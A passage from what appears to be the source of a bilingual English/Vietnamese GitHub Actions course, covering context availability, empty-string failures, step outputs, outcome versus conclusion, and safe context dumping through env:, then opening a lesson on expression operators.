<div class="lz-layer"><span class="lz-lname"><code>job</code> · <code>vars</code> · <code>strategy</code></span><span class="lz-lnote"><code>job.status</code> and service container details; <code>vars</code> for non-secret configuration variables; <code>strategy.job-index</code> and <code>fail-fast</code>. Rarely needed, but <code>vars</code> is the right home for a non-secret value you would otherwise make a secret out of habit</span></div>
</div>

<div class="callout warn">
<p><strong>An unavailable context does not error. It evaluates to empty.</strong> <code>&#36;{{ steps.khong-co.outputs.x }}</code> is the empty string, and so is <code>&#36;{{ matrix.os }}</code> in a job with no matrix. Which means a mistyped step id produces a step that runs with a blank argument and often succeeds at doing nothing — the exact failure shape that survives review, passes CI, and is found in production. When an expression yields nothing, the first suspect is availability, not the value.</p>
</div>

<h3>The <code>steps</code> context needs two things you must remember to write</h3>
${slide('ga-03', 13, 'steps: needs id + GITHUB_OUTPUT; outcome ≠ conclusion')}

<pre><code>- name: Xac dinh the phien ban
  id: tag                          <span class="tok-comment"># 1. phai co id:</span>
  run: echo "tag=v1.2.3" &gt;&gt; \$GITHUB_OUTPUT   <span class="tok-comment"># 2. phai ghi vao GITHUB_OUTPUT</span>

- name: Dung the do
  run: echo "&#36;{{ steps.tag.outputs.tag }}"</code></pre>

<p>Miss the <code>id:</code> and the step has no name in the context. Miss the <code>\$GITHUB_OUTPUT</code> write and the step exists but has no outputs. Both produce the same symptom — an empty string — and this repository uses exactly this pattern three times, all of them for a version tag.</p>

<div class="pitfall">
<p><strong>Trap — <code>outcome</code> and <code>conclusion</code> are not the same value.</strong> <code>steps.&lt;id&gt;.outcome</code> is the result <em>before</em> <code>continue-on-error</code> is applied; <code>conclusion</code> is the result <em>after</em>. So for a step marked <code>continue-on-error: true</code> that failed, <code>outcome</code> is <code>failure</code> and <code>conclusion</code> is <code>success</code>. If you want a later step to react to the real failure of a tolerated step — which is the entire reason to tolerate it and then report — you must read <code>outcome</code>. Reading <code>conclusion</code> gives you a condition that is never true, silently.</p>
</div>

<h3>The count, redone on the real repository</h3>
${slide('ga-03', 12, 'An absent context does not error — it evaluates to empty')}
<p>This site&#39;s repository grew since the first count. Re-run it on 24/09/2026 across all 14 workflows and the distribution is:</p>
<div class="out">secrets 56   inputs 9   env 9   runner 5
github  5    steps  4   matrix 4   hashFiles 2      tong: 94</div>
<p>The shape holds: <code>secrets</code> is 60%, and <code>github.event.*</code> — the part a stranger can type — appears <strong>zero</strong> times inside <code>run:</code>. The one surprise is <code>if: &#36;{{ inputs.lesson }}</code> in <code>ship-lab211.yml</code>, used as a plain boolean. That is correct here, and it is worth knowing why: the <code>inputs</code> context keeps a <code>type: boolean</code> input as a real boolean. Only the older <code>github.event.inputs.x</code> turns it into the string <code>'true'</code>/<code>'false'</code> — the two look identical until the day they behave differently, which is a 3.3 measurement.</p>
<h3>Reading a whole context, verified</h3>
<p>Dumping <code>toJSON(github)</code> through <code>env:</code> on the sandbox (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36001779915" target="_blank" rel="noopener">run 36001779915</a>) shows exactly what is inside and what is masked:</p>
<div class="out">{"event_name":"push","ref_name":"ch03-bieu-thuc","run_number":"1"}   <- run_number is a STRING
token: ***                                                            <- masked automatically
so khoa cap 1 cua github: 34
event.pull_request: null                                              <- absent on a push
so byte cua toJSON(github): 10997</div>
<p>Three lessons in one output. Numbers arrive as strings (<code>run_number</code> is <code>"1"</code>). The token is masked even when you print the whole context. And on a <code>push</code>, <code>github.event.pull_request</code> is <code>null</code> — a workflow reading it here gets nothing, which is the availability idea from a different angle: the property is not "wrong", it is simply absent for this event.</p>
<h3>Where a context does not exist at all</h3>
<div class="kv-grid">
<div class="kv"><span class="k">the <code>on:</code> block</span><span class="v">nothing is available. Triggers, branch filters and cron schedules are read before there is an event, a job or a runner. This is not a limitation to work around — it is why a workflow can be indexed and scheduled without running it</span></div>
<div class="kv"><span class="k">job-level <code>runs-on:</code></span><span class="v"><code>matrix</code> works — that is how 2.5&#39;s three platforms happen — but <code>env</code> does not. Compute the label in the matrix, not in an <code>env:</code> block</span></div>
<div class="kv"><span class="k">an <code>env:</code> block referring to itself</span><span class="v"><code>env: {A: 1, B: &#36;{{ env.A }}}</code> does not work. Within one block the values are not sequenced; set <code>B</code> in a later scope or write it out</span></div>
<div class="kv"><span class="k">a reusable workflow&#39;s secrets</span><span class="v">a called workflow does not inherit <code>secrets</code> automatically. It gets what you pass under <code>secrets:</code>, or everything with <code>secrets: inherit</code> — and the default of passing nothing produces, again, empty strings rather than errors</span></div>
</div>

<h3>Reading a context you have not memorised</h3>
${slide('ga-03', 14, 'To see what a context holds, print it — through env:')}

<p>The whole of any context is printable, and doing so once for the event that is confusing you is faster than reading documentation:</p>

<pre><code>- name: Do context ra xem
  run: |
    echo "\$GITHUB_CONTEXT"
    echo "\$NEEDS_CONTEXT"
  env:
    GITHUB_CONTEXT: &#36;{{ toJSON(github) }}
    NEEDS_CONTEXT: &#36;{{ toJSON(needs) }}</code></pre>

<div class="callout ok">
<p><strong>Note the shape: through <code>env:</code>, not directly into <code>run:</code>.</strong> <code>toJSON(github)</code> contains the entire event payload — including the PR title, branch names, and commit messages that 3.1 showed are attacker-controlled. Dumping it straight into a <code>run:</code> block is the injection bug with the payload chosen for you. The debugging technique and the safe technique are the same two extra lines.</p>
</div>

<div class="callout">
<p><strong>The one sentence.</strong> Contexts fail by being absent rather than by being wrong, so when an expression produces nothing, check <em>where</em> you wrote it before you check <em>what</em> you wrote.</p>
</div>

<div class="callout">
<p><strong>Common interview questions.</strong></p>
<p><strong>Q: Why is my expression empty instead of raising an error?</strong><br>A: An unavailable or misspelled context evaluates to the empty string, never to an error. Check the context-availability table for the key you wrote (a job-level <code>if:</code> cannot see <code>runner</code> or <code>steps</code>), and check for a typo in a step id or output name. When the value is empty, look at <em>where</em> you wrote the expression before <em>what</em>.</p>
<p><strong>Q: A boolean <code>workflow_dispatch</code> input — string or boolean?</strong><br>A: In the <code>inputs</code> context it is a real boolean, so <code>if: inputs.x</code> works. In the older <code>github.event.inputs.x</code> it is the string <code>'true'</code>/<code>'false'</code>, and a non-empty string is truthy, so compare it: <code>== 'true'</code>.</p>
<p><strong>Q: How do you debug "why did this run behave differently for this event"?</strong><br>A: Print the context: <code>env: GH: &#36;{{ toJSON(github) }}</code>, then <code>echo "$GH" | jq ...</code>. Through <code>env:</code>, never straight into <code>run:</code>, because it contains free text. Compare <code>github.event</code> across two events; its shape differs per trigger.</p>
</div>

<h3>🧪 Practice (15–20 min)</h3>
<div class="callout ok"><p><strong>Scenario:</strong> a version-tag step in your repo intermittently produces a blank tag, and you suspect an availability problem, not a logic bug.</p><ol>
<li>In a test repository, add a job whose step 1 has <code>id: tag</code> and writes <code>echo "tag=v1.$GITHUB_RUN_NUMBER" &gt;&gt; "$GITHUB_OUTPUT"</code>. Step 2 echoes <code>&#36;{{ steps.tag.outputs.tag }}</code>; step 3 echoes <code>&#36;{{ steps.taag.outputs.tag }}</code> (deliberate typo).</li>
<li>Add a step that dumps <code>&#36;{{ toJSON(needs) }}</code> and <code>&#36;{{ toJSON(matrix) }}</code> through <code>env:</code> in a job with no <code>needs</code> and no matrix.</li>
<li>Add, at job level, <code>if: steps.tag.outputs.tag != ''</code>. Run actionlint; read what it says about <code>steps</code> at job level.</li>
<li>Push, open the run, and note which values are empty and which raised an error.</li></ol>
<p><strong>Done when:</strong> the typo step printed nothing (no error); <code>toJSON(needs)</code> and <code>toJSON(matrix)</code> were <code>{}</code>/empty, not errors; and the job-level <code>steps</code> condition was rejected by actionlint because <code>steps</code> is not available there.</p></div>

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Context</span><span class="v">A named bag of values: <code>github</code>, <code>env</code>, <code>secrets</code>, <code>runner</code>, <code>steps</code>, <code>needs</code>, <code>matrix</code>, <code>inputs</code>, <code>job</code>, <code>vars</code>, <code>strategy</code>.</span></div>
  <div class="kv"><span class="k">Availability</span><span class="v">Which contexts a given workflow key may use; the documented table. A context outside its list evaluates to empty or invalidates the file.</span></div>
  <div class="kv"><span class="k"><code>outcome</code></span><span class="v">A step&#39;s result <em>before</em> <code>continue-on-error</code> is applied.</span></div>
  <div class="kv"><span class="k"><code>conclusion</code></span><span class="v">A step&#39;s result <em>after</em> <code>continue-on-error</code>: a tolerated failure becomes <code>success</code>.</span></div>
  <div class="kv"><span class="k"><code>vars</code></span><span class="v">Non-secret configuration variables; not masked, the right home for a value that is configurable but not sensitive.</span></div>
  <div class="kv"><span class="k"><code>needs.&lt;job&gt;</code></span><span class="v">Only the jobs this job declared in <code>needs:</code>; anything else is absent.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
<li>A context only exists in certain keys; the documented availability table is the answer to most "why is my expression empty" questions.</li>
<li><code>secrets</code> is not usable in <code>if:</code> at any level and never in <code>on:</code>; route it through <code>env:</code> and test the variable.</li>
<li>An unavailable or mistyped context evaluates to empty, never to an error — the exact failure that survives review.</li>
<li>Re-counted 24/09/2026: 94 expressions in 14 workflows, <code>secrets</code> 56, and zero <code>github.event.*</code> inside <code>run:</code>.</li>
<li>A <code>type: boolean</code> input is a real boolean in <code>inputs</code>, a string in <code>github.event.inputs</code>.</li>
<li><code>outcome</code> is the pre-tolerance result, <code>conclusion</code> the post-tolerance one; read <code>outcome</code> to react to a tolerated failure.</li>
</ul>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Contexts</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/contexts — every context, every property, and the availability table that says which contexts can be used in which keys. That table is the answer to most "why is my expression empty" questions.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Webhook events and payloads</span><span class="lc-sub">docs.github.com/en/webhooks/webhook-events-and-payloads — what is actually inside <code>github.event</code> for each trigger. The shape differs per event, which is why a workflow reading <code>github.event.pull_request</code> gets nothing on a push.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Variables: configuration variables (vars)</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/variables#defining-configuration-variables-for-multiple-workflows — the <code>vars</code> context, for values that need to be configurable but are not sensitive and should not be masked in logs.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">TypeScript — optional chaining, and the value that is quietly undefined</span><span class="lc-sub">/courses/typescript/learn${REF} — the same class of bug in another language: a lookup that returns nothing instead of failing, and the discipline of making absence visible at the boundary.</span></span></div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.2</span>
<h2>Context, và lúc nào cái nào tồn tại</h2>
<p class="lead">Một context là một túi giá trị có tên. Có khoảng chục cái, chúng đều có tài liệu, và phần thật sự gây lỗi không phải là chúng CHỨA gì — mà là mỗi cái chỉ tồn tại ở MỘT SỐ CHỖ trong tệp, và tham chiếu một cái ở chỗ nó không tồn tại thì bạn nhận về một chuỗi rỗng chứ không phải một lỗi.</p>

<h3>Kho này thật sự dùng gì</h3>
${slide('ga-03', 11, 'api-backend: 94 biểu thức, phần lớn là cấu hình')}

<p>Mọi <code>&#36;{{ }}</code> trong cả mười một workflow, nhóm theo context mà nó mở đầu bằng:</p>

<div class="out">secrets  44   env      9   runner    5   matrix   4
inputs    4   steps    3   github    3   hashFiles 2
                                      tong: 74 bieu thuc</div>

<p>Hai điều rơi ra từ phân bố ấy. Bí mật chiếm 59% tổng số biểu thức ở đây — vì workflow của kho này chủ yếu đi deploy, và deploy nghĩa là thông tin đăng nhập. Còn context <code>github</code>, cái mà người ta viết về nhiều nhất, xuất hiện ba lần. Trong workflow thật, biểu thức áp đảo là về <em>CẤU HÌNH BẠN CUNG CẤP</em>, chứ không phải về sự kiện.</p>

<div class="out">secrets.VPS_HOST              18
secrets.VPS_USER               9
secrets.VPS_SSH_PRIVATE_KEY    9
runner.os                      5
secrets.RELEASE_TOKEN          4
inputs.version                 4
env.FRONTEND_IMAGE             4
env.BACKEND_IMAGE              4
steps.tag.outputs.tag          3
matrix.ten                     2
github.sha                     2</div>

<h3>Các context, và mỗi cái dùng được ở đâu</h3>
${slide('ga-03', 9, 'Mỗi khoá chỉ thấy một số context — bảng “Context availability”')}

<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>github</code></span><span class="lz-lnote">sự kiện và kho: <code>sha</code>, <code>ref</code>, <code>event_name</code>, <code>actor</code>, <code>repository</code>, và trọn gói dữ liệu thô nằm dưới <code>github.event</code>. Dùng được gần như mọi nơi. Cũng là context nhiều khả năng chứa thứ một người lạ gõ vào nhất — xem bài 3.1</span></div>
<div class="lz-layer"><span class="lz-lname"><code>secrets</code></span><span class="lz-lnote">bí mật của kho, của môi trường và của tổ chức, cộng với <code>GITHUB_TOKEN</code> tự động. <strong>Không dùng được trong <code>if:</code> ở BẤT KỲ mức nào, và không dùng được trong <code>on:</code></strong> — đo thật: <code>secrets.X != ''</code> trong <code>if:</code> của bước làm tệp không hợp lệ (Unrecognized named-value 'secrets'). Đưa nó qua <code>env:</code> rồi kiểm biến ấy. Bị che trong log thành <code>***</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>env</code></span><span class="lz-lnote">các biến đặt bằng <code>env:</code> ở mức workflow, job hay bước. Không dùng được trong chính cái khối <code>env:</code> định nghĩa ra nó, và không dùng được trong <code>runs-on:</code> ở mức job — một hạn chế làm bất ngờ những ai định TÍNH ra một nhãn runner</span></div>
<div class="lz-layer"><span class="lz-lname"><code>runner</code></span><span class="lz-lnote"><code>os</code>, <code>arch</code>, <code>temp</code>, <code>tool_cache</code>. Chỉ có bên trong một job — nó mô tả một cỗ máy, mà ngoài job thì không có cỗ máy nào. Đó là lý do nó chạy được trong một khoá cache mà không chạy được trong <code>on:</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>matrix</code></span><span class="lz-lnote">chỉ trong một job có <code>strategy.matrix</code>. Mọi khoá bạn viết trong mục ma trận, kể cả những cái bạn tự bịa ra như <code>ten</code> và <code>lenh</code> ở bài 2.5</span></div>
<div class="lz-layer"><span class="lz-lname"><code>needs</code></span><span class="lz-lnote"><code>needs.&lt;job&gt;.result</code> và <code>needs.&lt;job&gt;.outputs.&lt;tên&gt;</code>. Chỉ cho những job thật sự có tên trong <code>needs:</code> của job này — một job bạn không khai phụ thuộc thì đơn giản là không có ở đó</span></div>
<div class="lz-layer"><span class="lz-lname"><code>steps</code></span><span class="lz-lnote"><code>steps.&lt;id&gt;.outputs.&lt;tên&gt;</code>, <code>.outcome</code>, <code>.conclusion</code>. Chỉ cho những bước CÓ <code>id:</code>, và chỉ cho những bước ĐÃ CHẠY trong job này</span></div>
<div class="lz-layer"><span class="lz-lname"><code>inputs</code></span><span class="lz-lnote">từ tham số của <code>workflow_dispatch</code> hoặc tham số <code>workflow_call</code> của một workflow dùng lại. Mười trên mười một workflow của kho này chỉ chạy tay, và đó là lý do <code>inputs</code> xuất hiện ngang tần suất với <code>matrix</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>job</code> · <code>vars</code> · <code>strategy</code></span><span class="lz-lnote"><code>job.status</code> và chi tiết container dịch vụ; <code>vars</code> cho biến cấu hình không bí mật; <code>strategy.job-index</code> và <code>fail-fast</code>. Ít khi cần, nhưng <code>vars</code> mới là chỗ đúng cho một giá trị không bí mật mà bạn hay biến thành secret theo thói quen</span></div>
</div>

<div class="callout warn">
<p><strong>Một context không dùng được thì KHÔNG báo lỗi. Nó tính ra RỖNG.</strong> <code>&#36;{{ steps.khong-co.outputs.x }}</code> là chuỗi rỗng, và <code>&#36;{{ matrix.os }}</code> trong một job không có ma trận cũng vậy. Nghĩa là một id bước gõ sai sẽ đẻ ra một bước chạy với một tham số trống và thường thành công trong việc chẳng làm gì — đúng cái hình dạng hỏng sống sót qua review, qua CI, và bị tìm thấy ở production. Khi một biểu thức cho ra rỗng, nghi phạm đầu tiên là TÍNH KHẢ DỤNG, không phải giá trị.</p>
</div>

<h3>Context <code>steps</code> cần HAI thứ mà bạn phải nhớ viết</h3>
${slide('ga-03', 13, 'steps: cần id + GITHUB_OUTPUT; outcome ≠ conclusion')}

<pre><code>- name: Xac dinh the phien ban
  id: tag                          <span class="tok-comment"># 1. phai co id:</span>
  run: echo "tag=v1.2.3" &gt;&gt; \$GITHUB_OUTPUT   <span class="tok-comment"># 2. phai ghi vao GITHUB_OUTPUT</span>

- name: Dung the do
  run: echo "&#36;{{ steps.tag.outputs.tag }}"</code></pre>

<p>Thiếu <code>id:</code> thì bước ấy không có tên trong context. Thiếu lượt ghi vào <code>\$GITHUB_OUTPUT</code> thì bước có tồn tại nhưng không có output nào. Cả hai đẻ ra cùng một triệu chứng — một chuỗi rỗng — và kho này dùng đúng khuôn mẫu này ba lần, cả ba đều cho một thẻ phiên bản.</p>

<div class="pitfall">
<p><strong>Bẫy — <code>outcome</code> và <code>conclusion</code> KHÔNG phải cùng một giá trị.</strong> <code>steps.&lt;id&gt;.outcome</code> là kết quả <em>TRƯỚC</em> khi áp <code>continue-on-error</code>; <code>conclusion</code> là kết quả <em>SAU</em>. Nên với một bước gắn <code>continue-on-error: true</code> mà hỏng, <code>outcome</code> là <code>failure</code> còn <code>conclusion</code> là <code>success</code>. Nếu bạn muốn một bước sau phản ứng với cú hỏng THẬT của một bước được dung thứ — mà đó chính là toàn bộ lý do để dung thứ rồi báo cáo — thì bạn phải đọc <code>outcome</code>. Đọc <code>conclusion</code> cho bạn một điều kiện không bao giờ đúng, một cách âm thầm.</p>
</div>

<h3>Đếm lại trên kho thật</h3>
${slide('ga-03', 12, 'Context vắng mặt không báo lỗi — nó ra rỗng')}
<p>Kho của trang này đã lớn thêm từ lần đếm đầu. Đếm lại ngày 24/09/2026 trên cả 14 workflow, phân bố là:</p>
<div class="out">secrets 56   inputs 9   env 9   runner 5
github  5    steps  4   matrix 4   hashFiles 2      tong: 94</div>
<p>Hình dạng vẫn giữ: <code>secrets</code> chiếm 60%, và <code>github.event.*</code> — phần một người lạ gõ được — xuất hiện <strong>0</strong> lần bên trong <code>run:</code>. Điều bất ngờ duy nhất là <code>if: &#36;{{ inputs.lesson }}</code> trong <code>ship-lab211.yml</code>, dùng như một boolean trơn. Ở đây nó ĐÚNG, và đáng biết vì sao: context <code>inputs</code> giữ một tham số <code>type: boolean</code> là boolean thật. Chỉ context cũ <code>github.event.inputs.x</code> mới biến nó thành chuỗi <code>'true'</code>/<code>'false'</code> — hai cái trông y hệt nhau cho tới ngày chúng cư xử khác nhau, một phép đo của bài 3.3.</p>
<h3>Đọc trọn một context, đã kiểm</h3>
<p>Đổ <code>toJSON(github)</code> qua <code>env:</code> trên sân tập (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36001779915" target="_blank" rel="noopener">run 36001779915</a>) cho thấy chính xác cái gì bên trong và cái gì bị che:</p>
<div class="out">{"event_name":"push","ref_name":"ch03-bieu-thuc","run_number":"1"}   <- run_number là CHUỖI
token: ***                                                            <- tự che
so khoa cap 1 cua github: 34
event.pull_request: null                                              <- vắng khi push
so byte cua toJSON(github): 10997</div>
<p>Ba bài học trong một đầu ra. Số tới nơi dưới dạng chuỗi (<code>run_number</code> là <code>"1"</code>). Token bị che cả khi bạn in trọn context. Và trên một <code>push</code>, <code>github.event.pull_request</code> là <code>null</code> — một workflow đọc nó ở đây nhận về con số không, chính là ý "context có ở đâu" nhìn từ một góc khác: thuộc tính không "sai", nó đơn giản là VẮNG MẶT với sự kiện này.</p>
<h3>Chỗ mà một context hoàn toàn không tồn tại</h3>
<div class="kv-grid">
<div class="kv"><span class="k">khối <code>on:</code></span><span class="v">không gì dùng được cả. Kích hoạt, bộ lọc nhánh và lịch cron được đọc trước khi có một sự kiện, một job hay một runner. Đây không phải một hạn chế cần lách — nó là lý do một workflow được lập chỉ mục và lên lịch được mà không cần chạy nó</span></div>
<div class="kv"><span class="k"><code>runs-on:</code> ở mức job</span><span class="v"><code>matrix</code> chạy được — đó là cách ba nền tảng ở bài 2.5 xảy ra — nhưng <code>env</code> thì không. Hãy tính nhãn trong ma trận, đừng tính trong một khối <code>env:</code></span></div>
<div class="kv"><span class="k">một khối <code>env:</code> tự tham chiếu chính nó</span><span class="v"><code>env: {A: 1, B: &#36;{{ env.A }}}</code> không chạy. Trong cùng một khối các giá trị không được xếp thứ tự; hãy đặt <code>B</code> ở một phạm vi sau, hoặc viết thẳng ra</span></div>
<div class="kv"><span class="k">bí mật của một workflow dùng lại</span><span class="v">một workflow được gọi KHÔNG tự động thừa kế <code>secrets</code>. Nó nhận thứ bạn truyền dưới <code>secrets:</code>, hoặc toàn bộ với <code>secrets: inherit</code> — và cái mặc định truyền-không-gì lại đẻ ra, một lần nữa, chuỗi rỗng chứ không phải lỗi</span></div>
</div>

<h3>Đọc một context mà bạn chưa thuộc</h3>
${slide('ga-03', 14, 'Muốn biết context chứa gì: in nó ra — qua env:')}

<p>Trọn vẹn bất kỳ context nào cũng in ra được, và làm thế đúng một lần cho cái sự kiện đang làm bạn rối thì nhanh hơn đọc tài liệu:</p>

<pre><code>- name: Do context ra xem
  run: |
    echo "\$GITHUB_CONTEXT"
    echo "\$NEEDS_CONTEXT"
  env:
    GITHUB_CONTEXT: &#36;{{ toJSON(github) }}
    NEEDS_CONTEXT: &#36;{{ toJSON(needs) }}</code></pre>

<div class="callout ok">
<p><strong>Để ý cái hình dạng: qua <code>env:</code>, không đổ thẳng vào <code>run:</code>.</strong> <code>toJSON(github)</code> chứa trọn gói dữ liệu sự kiện — kể cả tiêu đề PR, tên nhánh, và thông điệp commit mà bài 3.1 đã cho thấy là do kẻ tấn công kiểm soát. Đổ nó thẳng vào một khối <code>run:</code> là chính cái lỗi injection với phần tải được chọn sẵn cho bạn. Kỹ thuật gỡ lỗi và kỹ thuật an toàn là cùng hai dòng thêm vào ấy.</p>
</div>

<div class="callout">
<p><strong>Một câu.</strong> Context hỏng bằng cách VẮNG MẶT chứ không bằng cách sai, nên khi một biểu thức cho ra rỗng, hãy kiểm <em>CHỖ</em> bạn viết nó trước khi kiểm <em>CÁI</em> bạn viết.</p>
</div>

<div class="callout">
<p><strong>Câu hỏi phỏng vấn hay gặp.</strong></p>
<p><strong>H: Vì sao biểu thức của tôi ra RỖNG thay vì báo lỗi?</strong><br>Đ: Một context không dùng được hoặc gõ sai tính ra chuỗi rỗng, không bao giờ ra lỗi. Kiểm bảng "context có ở đâu" cho khoá bạn viết (<code>if:</code> mức job không thấy <code>runner</code> hay <code>steps</code>), và kiểm gõ sai id bước hay tên output. Khi giá trị rỗng, hãy xem <em>CHỖ</em> bạn viết trước <em>CÁI</em> bạn viết.</p>
<p><strong>H: Tham số boolean của <code>workflow_dispatch</code> — chuỗi hay boolean?</strong><br>Đ: Trong context <code>inputs</code> nó là boolean thật, nên <code>if: inputs.x</code> chạy được. Trong <code>github.event.inputs.x</code> cũ nó là chuỗi <code>'true'</code>/<code>'false'</code>, mà chuỗi khác rỗng là đúng, nên phải so: <code>== 'true'</code>.</p>
<p><strong>H: Gỡ lỗi "vì sao run cư xử khác với sự kiện này" thế nào?</strong><br>Đ: In context ra: <code>env: GH: &#36;{{ toJSON(github) }}</code>, rồi <code>echo "$GH" | jq ...</code>. Qua <code>env:</code>, không đổ thẳng vào <code>run:</code>, vì nó chứa chữ tự do. So <code>github.event</code> giữa hai sự kiện; hình dạng khác nhau theo kích hoạt.</p>
</div>

<h3>🧪 Thực hành (15–20 phút)</h3>
<div class="callout ok"><p><strong>Tình huống:</strong> một bước gắn thẻ phiên bản trong kho của bạn thỉnh thoảng ra thẻ trống, và bạn nghi là vấn đề tính-khả-dụng chứ không phải lỗi logic.</p><ol>
<li>Trong một kho thử, thêm một job mà bước 1 có <code>id: tag</code> và ghi <code>echo "tag=v1.$GITHUB_RUN_NUMBER" &gt;&gt; "$GITHUB_OUTPUT"</code>. Bước 2 echo <code>&#36;{{ steps.tag.outputs.tag }}</code>; bước 3 echo <code>&#36;{{ steps.taag.outputs.tag }}</code> (cố ý gõ sai).</li>
<li>Thêm một bước đổ <code>&#36;{{ toJSON(needs) }}</code> và <code>&#36;{{ toJSON(matrix) }}</code> qua <code>env:</code> trong một job không có <code>needs</code> và không có ma trận.</li>
<li>Thêm, ở mức job, <code>if: steps.tag.outputs.tag != ''</code>. Chạy actionlint; đọc nó nói gì về <code>steps</code> ở mức job.</li>
<li>Push, mở run, ghi lại giá trị nào rỗng và cái nào báo lỗi.</li></ol>
<p><strong>Đạt khi:</strong> bước gõ sai in ra rỗng (không lỗi); <code>toJSON(needs)</code> và <code>toJSON(matrix)</code> là <code>{}</code>/rỗng, không phải lỗi; và điều kiện <code>steps</code> ở mức job bị actionlint từ chối vì <code>steps</code> không dùng được ở đó.</p></div>

<h3>🗂 Thuật ngữ trong bài</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Context</span><span class="v">Một túi giá trị có tên: <code>github</code>, <code>env</code>, <code>secrets</code>, <code>runner</code>, <code>steps</code>, <code>needs</code>, <code>matrix</code>, <code>inputs</code>, <code>job</code>, <code>vars</code>, <code>strategy</code>.</span></div>
  <div class="kv"><span class="k">Tính khả dụng (availability)</span><span class="v">Một khoá workflow được dùng những context nào; là cái bảng trong tài liệu. Context ngoài danh sách của nó tính ra rỗng hoặc làm hỏng tệp.</span></div>
  <div class="kv"><span class="k"><code>outcome</code></span><span class="v">Kết quả của bước <em>TRƯỚC</em> khi áp <code>continue-on-error</code>.</span></div>
  <div class="kv"><span class="k"><code>conclusion</code></span><span class="v">Kết quả của bước <em>SAU</em> khi áp <code>continue-on-error</code>: một cú hỏng được tha thành <code>success</code>.</span></div>
  <div class="kv"><span class="k"><code>vars</code></span><span class="v">Biến cấu hình không bí mật; không bị che, đúng chỗ cho một giá trị cần cấu hình nhưng không nhạy cảm.</span></div>
  <div class="kv"><span class="k"><code>needs.&lt;job&gt;</code></span><span class="v">Chỉ những job mà job này khai trong <code>needs:</code>; thứ gì khác đều vắng mặt.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
<li>Một context chỉ tồn tại ở một số khoá; bảng tính-khả-dụng trong tài liệu là đáp án cho phần lớn câu "vì sao biểu thức của tôi rỗng".</li>
<li><code>secrets</code> không dùng được trong <code>if:</code> ở bất kỳ mức nào và không dùng được trong <code>on:</code>; đưa nó qua <code>env:</code> rồi kiểm biến.</li>
<li>Context không dùng được hoặc gõ sai tính ra rỗng, không bao giờ ra lỗi — đúng cái hình dạng hỏng sống sót qua review.</li>
<li>Đếm lại 24/09/2026: 94 biểu thức trong 14 workflow, <code>secrets</code> 56, và 0 chỗ dùng <code>github.event.*</code> bên trong <code>run:</code>.</li>
<li>Tham số <code>type: boolean</code> là boolean thật trong <code>inputs</code>, là chuỗi trong <code>github.event.inputs</code>.</li>
<li><code>outcome</code> là kết quả trước-khi-tha, <code>conclusion</code> là sau-khi-tha; đọc <code>outcome</code> để phản ứng với cú hỏng được tha.</li>
</ul>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Contexts</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/contexts — mọi context, mọi thuộc tính, và cái bảng khả dụng nói context nào dùng được trong khoá nào. Bảng đó là đáp án cho phần lớn câu hỏi "vì sao biểu thức của tôi rỗng".</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Webhook events and payloads</span><span class="lc-sub">docs.github.com/en/webhooks/webhook-events-and-payloads — thật sự có gì bên trong <code>github.event</code> cho từng kích hoạt. Hình dạng khác nhau theo sự kiện, và đó là lý do một workflow đọc <code>github.event.pull_request</code> nhận được con số không khi có push.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Variables: configuration variables (vars)</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/variables#defining-configuration-variables-for-multiple-workflows — context <code>vars</code>, dành cho những giá trị cần cấu hình được nhưng không nhạy cảm và không nên bị che trong log.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">TypeScript — optional chaining, và cái giá trị âm thầm undefined</span><span class="lc-sub">/courses/typescript/learn${REF} — cùng lớp lỗi ở một ngôn ngữ khác: một phép tra cứu trả về rỗng thay vì báo hỏng, và kỷ luật làm cho sự VẮNG MẶT hiện ra ngay ở biên.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 3.3 ─────────────────────────── */
    {
      title: '3.3 — Operators, coercion, and the condition that fails open|||3.3 — Toán tử, ép kiểu, và điều kiện hỏng theo hướng MỞ',
      slug: 'ga-3-3-ep-kieu',
      type: 'VIDEO',
      description: 'Đo thật trên GitHub (không phải bộ đọc YAML của Python): `if: \'false\'` BỎ QUA bước. Bẫy thật là chữ nằm ngoài `${{ }}` (luôn đúng) và chuỗi `\'false\'` sinh lúc chạy. `if: off`/`if: no` làm hỏng cả file.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.3</span>
<h2>Operators, coercion, and the condition that fails open</h2>
<p class="lead">The expression language is small: comparison, logic, a handful of functions. What makes it worth a lesson is that it coerces types before comparing, and the coercion produces one specific outcome that turns a disabled step back on.</p>

<h3>The operators</h3>
<div class="kv-grid">
<div class="kv"><span class="k">comparison</span><span class="v"><code>==</code> <code>!=</code> <code>&lt;</code> <code>&lt;=</code> <code>&gt;</code> <code>&gt;=</code>. There is no strict-equality operator — <code>==</code> always coerces first</span></div>
